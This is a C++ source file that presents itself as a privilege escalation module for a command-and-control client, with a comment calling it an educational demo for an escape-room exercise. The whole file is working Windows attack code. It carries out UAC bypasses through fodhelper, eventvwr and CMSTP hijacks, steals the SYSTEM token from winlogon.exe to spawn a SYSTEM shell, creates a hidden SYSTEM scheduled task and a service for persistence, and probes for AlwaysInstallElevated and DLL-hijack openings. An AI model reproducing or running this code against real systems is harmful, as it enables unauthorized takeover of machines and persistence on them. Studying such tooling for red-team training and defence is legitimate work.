// Privilege Escalation Module for C2 Client
// Educational/Demo purposes only - For Palo Alto Networks Escape Room

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <shellapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <sddl.h>
#include <userenv.h>
#include <wtsapi32.h>
#include <tlhelp32.h>

#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

class PrivilegeEscalation {
private:
    bool isElevated;
    
public:
    PrivilegeEscalation() {
        isElevated = CheckIfElevated();
    }
    
    bool CheckIfElevated() {
        BOOL fIsElevated = FALSE;
        HANDLE hToken = NULL;
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                fIsElevated = elevation.TokenIsElevated;
            }
            CloseHandle(hToken);
        }
        return fIsElevated;
    }
    
    // Method 1: UAC Bypass using fodhelper.exe
    bool UACBypassFodhelper() {
        if (isElevated) return true;
        
        std::cout << "[*] Attempting UAC bypass using fodhelper.exe..." << std::endl;
        
        // Set registry key
        HKEY hKey;
        std::string keyPath = "Software\\Classes\\ms-settings\\shell\\open\\command";
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, NULL, 
                           REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            
            // Set default value
            RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
            
            // Set DelegateExecute to empty
            std::string empty = "";
            RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)empty.c_str(), 1);
            
            RegCloseKey(hKey);
            
            // Execute fodhelper
            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;
            
            if (ShellExecuteExA(&sei)) {
                std::cout << "[+] UAC bypass successful!" << std::endl;
                
                // Cleanup
                RegDeleteKeyA(HKEY_CURRENT_USER, keyPath.c_str());
                return true;
            }
        }
        
        std::cout << "[-] UAC bypass failed" << std::endl;
        return false;
    }
    
    // Method 2: UAC Bypass using eventvwr.exe
    bool UACBypassEventvwr() {
        if (isElevated) return true;
        
        std::cout << "[*] Attempting UAC bypass using eventvwr.exe..." << std::endl;
        
        HKEY hKey;
        std::string keyPath = "Software\\Classes\\mscfile\\shell\\open\\command";
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, NULL,
                           REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            
            RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
            RegCloseKey(hKey);
            
            // Execute eventvwr
            system("eventvwr.exe");
            
            Sleep(2000);
            
            // Cleanup
            RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command");
            RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open");
            RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell");
            RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile");
            
            return true;
        }
        
        return false;
    }
    
    // Method 3: Token Impersonation (requires SeImpersonatePrivilege)
    bool TokenImpersonation() {
        std::cout << "[*] Attempting token impersonation..." << std::endl;
        
        // Enable debug privilege first
        EnableDebugPrivilege();
        
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;
        HANDLE hProcess = NULL;
        
        // Find winlogon.exe process (runs as SYSTEM)
        DWORD winlogonPid = GetProcessIdByName("winlogon.exe");
        if (winlogonPid == 0) {
            std::cout << "[-] Could not find winlogon.exe" << std::endl;
            return false;
        }
        
        // Open the process
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
        if (!hProcess) {
            std::cout << "[-] Could not open winlogon.exe process" << std::endl;
            return false;
        }
        
        // Open process token
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
            std::cout << "[-] Could not open process token" << std::endl;
            CloseHandle(hProcess);
            return false;
        }
        
        // Duplicate token
        if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
            std::cout << "[-] Could not duplicate token" << std::endl;
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        
        // Impersonate the token
        if (ImpersonateLoggedOnUser(hDupToken)) {
            std::cout << "[+] Successfully impersonated SYSTEM token!" << std::endl;
            
            // Create new process with SYSTEM privileges
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            
            char cmdLine[] = "cmd.exe";
            if (CreateProcessAsUserA(hDupToken, NULL, cmdLine, NULL, NULL, FALSE, 
                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                std::cout << "[+] Spawned SYSTEM cmd.exe!" << std::endl;
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            
            RevertToSelf();
        }
        
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        
        return true;
    }
    
    // Method 4: Service Creation (requires admin but demonstrates persistence)
    bool CreateSystemService() {
        std::cout << "[*] Attempting to create SYSTEM service..." << std::endl;
        
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!hSCManager) {
            std::cout << "[-] Could not open Service Control Manager" << std::endl;
            return false;
        }
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        SC_HANDLE hService = CreateServiceA(
            hSCManager,
            "EscapeBoxService",
            "Escape Box System Service",
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            exePath,
            NULL, NULL, NULL, NULL, NULL
        );
        
        if (hService) {
            std::cout << "[+] Service created successfully!" << std::endl;
            
            // Start the service
            if (StartService(hService, 0, NULL)) {
                std::cout << "[+] Service started!" << std::endl;
            }
            
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return true;
        }
        
        CloseServiceHandle(hSCManager);
        return false;
    }
    
    // Method 5: AlwaysInstallElevated (if enabled in registry)
    bool CheckAlwaysInstallElevated() {
        std::cout << "[*] Checking AlwaysInstallElevated registry keys..." << std::endl;
        
        DWORD value = 0;
        DWORD size = sizeof(value);
        
        // Check HKLM
        if (RegGetValueA(HKEY_LOCAL_MACHINE, 
                        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                        "AlwaysInstallElevated", RRF_RT_DWORD, NULL, &value, &size) == ERROR_SUCCESS) {
            if (value == 1) {
                // Check HKCU
                size = sizeof(value);
                if (RegGetValueA(HKEY_CURRENT_USER,
                               "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                               "AlwaysInstallElevated", RRF_RT_DWORD, NULL, &value, &size) == ERROR_SUCCESS) {
                    if (value == 1) {
                        std::cout << "[+] AlwaysInstallElevated is enabled! Can install MSI as SYSTEM" << std::endl;
                        return true;
                    }
                }
            }
        }
        
        std::cout << "[-] AlwaysInstallElevated is not enabled" << std::endl;
        return false;
    }
    
    // Method 6: Scheduled Task with SYSTEM privileges
    bool CreateScheduledTaskAsSystem() {
        std::cout << "[*] Creating scheduled task to run as SYSTEM..." << std::endl;
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        std::string taskXml = R"(<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-01T00:00:00</Date>
    <Author>SYSTEM</Author>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>)" + std::string(exePath) + R"(</Command>
    </Exec>
  </Actions>
</Task>)";
        
        // Write XML to temp file
        std::string xmlPath = "C:\\Windows\\Temp\\systask.xml";
        FILE* f = nullptr;
        errno_t err = fopen_s(&f, xmlPath.c_str(), "w");
        if (err == 0 && f) {
            fprintf(f, "%s", taskXml.c_str());
            fclose(f);
            
            // Create task
            std::string cmd = "schtasks /create /tn \"SystemEscapeTask\" /xml \"" + xmlPath + "\" /f";
            if (system(cmd.c_str()) == 0) {
                std::cout << "[+] Scheduled task created!" << std::endl;
                
                // Run the task
                system("schtasks /run /tn \"SystemEscapeTask\"");
                
                // Cleanup
                DeleteFileA(xmlPath.c_str());
                return true;
            }
            
            DeleteFileA(xmlPath.c_str());
        }
        
        return false;
    }
    
    // Method 7: DLL Hijacking vulnerable services
    bool FindDLLHijackingOpportunities() {
        std::cout << "[*] Searching for DLL hijacking opportunities..." << std::endl;
        
        // Common vulnerable locations
        std::vector<std::string> vulnerablePaths = {
            "C:\\Program Files\\Common Files",
            "C:\\Program Files (x86)\\Common Files",
            "C:\\Windows\\System32\\spool\\drivers\\color",
            "C:\\Windows\\System32\\spool\\prtprocs\\x64",
            "C:\\Windows\\Tasks",
            "C:\\Windows\\tracing"
        };
        
        for (const auto& path : vulnerablePaths) {
            DWORD attrs = GetFileAttributesA(path.c_str());
            if (attrs != INVALID_FILE_ATTRIBUTES) {
                // Check if we can write to this directory
                std::string testFile = path + "\\test.txt";
                HANDLE hFile = CreateFileA(testFile.c_str(), GENERIC_WRITE, 0, NULL,
                                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    std::cout << "[+] Writable path found: " << path << std::endl;
                    CloseHandle(hFile);
                    DeleteFileA(testFile.c_str());
                }
            }
        }
        
        return true;
    }
    
    // Helper function to enable debug privilege
    bool EnableDebugPrivilege() {
        HANDLE hToken;
        TOKEN_PRIVILEGES tp;
        LUID luid;
        
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            return false;
        }
        
        if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
            CloseHandle(hToken);
            return false;
        }
        
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
            CloseHandle(hToken);
            return false;
        }
        
        CloseHandle(hToken);
        return true;
    }
    
    // Helper function to get process ID by name
    DWORD GetProcessIdByName(const char* processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                char exeName[MAX_PATH];
                size_t converted;
                wcstombs_s(&converted, exeName, MAX_PATH, pe32.szExeFile, _TRUNCATE);
                if (_stricmp(exeName, processName) == 0) {
                    CloseHandle(hSnapshot);
                    return pe32.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return 0;
    }
    
    // Method 8: Bypass UAC via CMSTP
    bool UACBypassCMSTP() {
        std::cout << "[*] Attempting UAC bypass using CMSTP..." << std::endl;
        
        // Create INF file
        std::string infContent = R"([version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands here will be run with elevated privileges
)" + std::string(GetCommandLineA()) + R"(
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="EscapeBox"
ShortSvcName="EscapeBox"
)";
        
        // Write INF file
        std::string infPath = "C:\\Windows\\Temp\\bypass.inf";
        FILE* f = nullptr;
        errno_t err = fopen_s(&f, infPath.c_str(), "w");
        if (err == 0 && f) {
            fprintf(f, "%s", infContent.c_str());
            fclose(f);
            
            // Execute CMSTP with the INF file
            std::string cmd = "cmstp.exe /au \"" + infPath + "\"";
            system(cmd.c_str());
            
            Sleep(2000);
            
            // Cleanup
            DeleteFileA(infPath.c_str());
            return true;
        }
        
        return false;
    }
    
    // Main escalation function that tries multiple methods
    bool EscalatePrivileges() {
        if (isElevated) {
            std::cout << "[*] Already running with elevated privileges!" << std::endl;
            return true;
        }
        
        std::cout << "[*] Starting privilege escalation attempts..." << std::endl;
        
        // Try UAC bypasses first (less intrusive)
        if (UACBypassFodhelper()) return true;
        if (UACBypassEventvwr()) return true;
        if (UACBypassCMSTP()) return true;
        
        // Check for misconfigurations
        if (CheckAlwaysInstallElevated()) {
            std::cout << "[!] Can exploit AlwaysInstallElevated!" << std::endl;
        }
        
        // Try token manipulation
        if (TokenImpersonation()) return true;
        
        // Try scheduled task
        if (CreateScheduledTaskAsSystem()) return true;
        
        // Try service creation (requires existing admin)
        if (CreateSystemService()) return true;
        
        // Look for DLL hijacking opportunities
        FindDLLHijackingOpportunities();
        
        return false;
    }
};

// Function to be called from main client
bool AttemptPrivilegeEscalation() {
    PrivilegeEscalation privEsc;
    return privEsc.EscalatePrivileges();
}

// Function to check current privilege level
bool IsRunningAsAdmin() {
    PrivilegeEscalation privEsc;
    return privEsc.CheckIfElevated();
}
